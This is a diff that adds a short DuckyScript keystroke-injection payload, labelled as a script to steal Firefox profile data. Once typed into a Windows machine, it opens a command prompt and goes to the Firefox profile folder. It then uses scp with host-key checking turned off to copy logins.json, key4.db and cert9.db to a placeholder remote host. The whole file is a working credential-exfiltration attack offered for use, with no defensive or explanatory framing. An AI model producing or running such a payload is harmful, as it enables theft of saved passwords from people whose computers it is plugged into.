@@ -1,0 +1,25 @@
+REM Script to steal profile data from Firefox
+
+DEFAULT_DELAY 200
+DELAY 2000
+
+REM Open CMD
+GUI r
+STRING cmd
+ENTER
+
+DELAY 500
+
+REM cd into appdata, type command for profiles and autocomplete using TAB
+STRING cd %appdata%
+ENTER
+STRING cd Mozilla\Firefox\Profiles\
+TAB
+ENTER
+
+REM Don't verify host key
+STRING scp -oStrictHostKeyChecking=no logins.json key4.db cert9.db USER@REMOTE_IP:/PATH/TO/DIR/ 
+ENTER
+DELAY 300
+STRING SCP_PASSWORD
+ENTER
